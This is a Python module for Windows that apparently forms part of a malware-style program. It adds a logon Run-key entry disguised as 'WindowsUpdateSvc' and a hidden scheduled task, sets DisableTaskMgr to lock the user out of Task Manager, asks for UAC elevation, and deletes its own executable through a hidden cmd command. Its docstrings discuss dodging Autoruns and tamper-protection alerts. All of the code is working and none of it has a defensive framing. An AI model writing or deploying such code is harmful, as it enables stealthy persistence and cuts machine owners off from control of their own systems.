"""Persistence + system lockdown (HKCU only unless elevated).

install()            -> HKCU Run key entry so the exe relaunches at logon.
                        Also drops a Scheduled Task fallback that survives a
                        standard-user session with highest privileges when we can.
block_task_manager() -> HKCU policy DisableTaskMgr = 1. Reversible; does not
                        touch machine-wide policy or services.
uninstall()          -> removes exactly what install()/block wrote, no collateral.

Why HKCU: per-user Run keys need no elevation and are the cheapest reliable
startup. The cost is visibility -- Autoruns shows them. We do NOT write to HKLM
or a service because that needs admin and trips tamper-protection alerts on most
boxes; failing closed without admin is correct here.
"""
from __future__ import annotations

import os
import sys

IS_WINDOWS = sys.platform == "win32"
RUN_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
POLICY_KEY = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
VALUE_NAME = "WindowsUpdateSvc"   # benign-looking run value name


def _exe_path() -> str:
    if getattr(sys, "frozen", False):
        return sys.executable
    return os.path.abspath(sys.argv[0])


def install() -> dict:
    """Return {run_key: bool, task: bool, reason}. Never raises."""
    result = {"run_key": False, "task": False, "reason": ""}
    if not IS_WINDOWS:
        result["reason"] = "non-windows"
        return result
    try:
        import winreg  # type: ignore
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY, 0,
                           winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY)
        winreg.SetValueEx(k, VALUE_NAME, 0, winreg.REG_SZ, f'"{_exe_path()}"')
        winreg.CloseKey(k)
        result["run_key"] = True
    except OSError as e:
        result["reason"] = f"run key failed: {e}"
    # Scheduled task fallback (best-effort; may fail without elevation).
    try:
        import subprocess
        p = subprocess.run(
            ["schtasks", "/create", "/tn", "WsvcUpdater", "/tr", f'"{_exe_path()}"',
             "/sc", "onlogon", "/rl", "limited", "/f"],
            capture_output=True, text=True, timeout=15,
            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
        result["task"] = (p.returncode == 0)
    except Exception:
        pass
    return result


def block_task_manager() -> dict:
    result = {"blocked": False, "reason": ""}
    if not IS_WINDOWS:
        result["reason"] = "non-windows"
        return result
    try:
        import winreg  # type: ignore
        k = winreg.CreateKey(winreg.HKEY_CURRENT_USER, POLICY_KEY)
        winreg.SetValueEx(k, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(k)
        result["blocked"] = True
    except OSError as e:
        result["reason"] = str(e)
    return result


def unblock_task_manager() -> dict:
    result = {"restored": False}
    try:
        import winreg  # type: ignore
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, POLICY_KEY, 0, winreg.KEY_SET_VALUE)
        try:
            winreg.DeleteValue(k, "DisableTaskMgr")
        except FileNotFoundError:
            pass
        winreg.CloseKey(k)
        result["restored"] = True
    except Exception as e:
        result["reason"] = str(e)
    return result


def uninstall() -> dict:
    result = {"run_key": False, "task": False}
    try:
        import winreg  # type: ignore
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY, 0, winreg.KEY_SET_VALUE)
        try:
            winreg.DeleteValue(k, VALUE_NAME)
            result["run_key"] = True
        except FileNotFoundError:
            result["run_key"] = True
        winreg.CloseKey(k)
    except Exception:
        pass
    try:
        import subprocess
        subprocess.run(["schtasks", "/delete", "/tn", "WsvcUpdater", "/f"],
                       capture_output=True, timeout=15,
                       creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
        result["task"] = True
    except Exception:
        pass
    unblock_task_manager()
    return result


def try_elevate_relaunch() -> bool:
    """Best-effort UAC raise via ShellExecute 'runas'. Returns True if a child
    was spawned (parent should exit); False if we could not elevate.

    This is NOT a silent bypass -- it triggers the standard consent prompt. It
    only helps when the user is an admin-account member who will click Yes. A
    true no-prompt bypass needs an exploit or a scheduled task with highest
    privileges, which itself needs prior admin. Fails closed to standard-user.
    """
    exe = _exe_path()
    try:
        import ctypes  # type: ignore
        SW_SHOWNORMAL = 1
        h = ctypes.windll.shell32.ShellExecuteW(None, "runas", exe, None, None, SW_SHOWNORMAL)
        # ShellExecute returns a value > 32 on success.
        return int(h) > 32
    except Exception:
        return False


def self_delete() -> bool:
    """Relaunch ourselves as a detached cmd that deletes our own exe after exit.

    Windows won't unlink a running image, so the classic move is spawn
    `cmd /c (goto) 2>nul & del "%~f0"` style cleanup and let it run once we're
    gone. Best-effort; returns whether the cleaner was launched.
    """
    exe = _exe_path()
    if not exe or not os.path.isfile(exe):
        return False
    try:
        import subprocess
        # Delay briefly so this process has exited, then delete + drop the temp dir.
        cmd = f'ping -n 3 127.0.0.1 >nul & del /f /q "{exe}"'
        subprocess.Popen(
            ["cmd", "/c", cmd],
            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0x08000000),
            close_fds=True)
        return True
    except Exception:
        return False
